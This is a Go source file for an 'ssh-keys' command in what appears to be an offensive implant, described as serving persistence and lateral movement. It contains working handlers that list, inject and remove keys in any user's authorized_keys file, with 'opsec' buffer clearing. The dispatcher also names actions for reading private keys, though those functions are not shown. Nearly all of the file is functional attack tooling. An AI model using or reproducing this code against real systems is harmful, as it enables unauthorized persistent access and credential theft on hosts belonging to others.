package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type SSHKeysCommand struct{}

func (c *SSHKeysCommand) Name() string {
	return "ssh-keys"
}

func (c *SSHKeysCommand) Description() string {
	return "Read or inject SSH authorized_keys for persistence/lateral movement (T1098.004)"
}

type sshKeysArgs struct {
	Action string `json:"action"`
	Key    string `json:"key"`
	User   string `json:"user"`
	Path   string `json:"path"`
}

func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
	var args sshKeysArgs

	if task.Params == "" {
		return errorResult("Error: parameters required. Use action: list, add, remove, read-private, generate")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Plain text fallback: "list", "enumerate", "read-private", "list root"
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.User = parts[1]
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return sshKeysList(args)
	case "add":
		return sshKeysAdd(args)
	case "remove":
		return sshKeysRemove(args)
	case "read-private":
		return sshKeysReadPrivate(args)
	case "enumerate":
		return sshKeysEnumerate(args)
	case "generate":
		return sshKeysGenerate(args)
	default:
		return errorf("Unknown action: %s. Use: list, add, remove, read-private, enumerate, generate", args.Action)
	}
}

// getSSHDir returns the .ssh directory for the target user
func getSSHDir(targetUser string) (string, error) {
	if targetUser != "" {
		u, err := user.Lookup(targetUser)
		if err != nil {
			return "", fmt.Errorf("user '%s' not found: %w", targetUser, err)
		}
		return filepath.Join(u.HomeDir, ".ssh"), nil
	}
	// Current user
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("cannot determine home directory: %w", err)
	}
	return filepath.Join(home, ".ssh"), nil
}

// sshKeysList reads authorized_keys
func sshKeysList(args sshKeysArgs) structs.CommandResult {
	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return errorf("Error: %v", err)
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	content, err := os.ReadFile(authKeysPath)
	if err != nil {
		return errorf("Error reading %s: %v", authKeysPath, err)
	}
	defer structs.ZeroBytes(content)

	output := strings.TrimSpace(string(content))
	if output == "" {
		output = "(empty file)"
	}

	// Count keys
	lines := strings.Split(output, "\n")
	keyCount := 0
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			keyCount++
		}
	}

	return successf("Authorized keys (%s) — %d key(s):\n%s", authKeysPath, keyCount, output)
}

// sshKeysAdd injects a public key into authorized_keys
func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
	if args.Key == "" {
		return errorResult("Error: 'key' is required (the SSH public key to inject)")
	}

	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return errorf("Error: %v", err)
	}

	// Create .ssh dir if it doesn't exist (0700 permissions)
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return errorf("Error creating %s: %v", sshDir, err)
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	// Read existing content
	existing, _ := os.ReadFile(authKeysPath)
	defer structs.ZeroBytes(existing) // opsec: clear SSH authorized_keys data
	existingStr := strings.TrimRight(string(existing), "\n")

	// Check if key already exists
	if strings.Contains(existingStr, strings.TrimSpace(args.Key)) {
		return successResult("Key already exists in authorized_keys")
	}

	// Append the new key
	newContent := existingStr
	if newContent != "" {
		newContent += "\n"
	}
	newContent += strings.TrimSpace(args.Key) + "\n"

	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
		return errorf("Error writing %s: %v", authKeysPath, err)
	}

	return successf("Injected SSH key into %s", authKeysPath)
}

// sshKeysRemove removes a key from authorized_keys
func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
	if args.Key == "" {
		return errorResult("Error: 'key' is required (substring to match for removal)")
	}

	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return errorf("Error: %v", err)
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	content, err := os.ReadFile(authKeysPath)
	if err != nil {
		return errorf("Error reading %s: %v", authKeysPath, err)
	}
	defer structs.ZeroBytes(content) // opsec: clear raw SSH key material

	lines := strings.Split(string(content), "\n")
	var kept []string
	removedCount := 0
	for _, line := range lines {
		if strings.Contains(line, args.Key) {
			removedCount++
			continue
		}
		kept = append(kept, line)
	}

	if removedCount == 0 {
		return errorf("No keys matching '%s' found", args.Key)
	}

	newContent := strings.Join(kept, "\n")
	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
		return errorf("Error writing %s: %v", authKeysPath, err)
	}

	return successf("Removed %d key(s) matching '%s' from %s", removedCount, args.Key, authKeysPath)
}
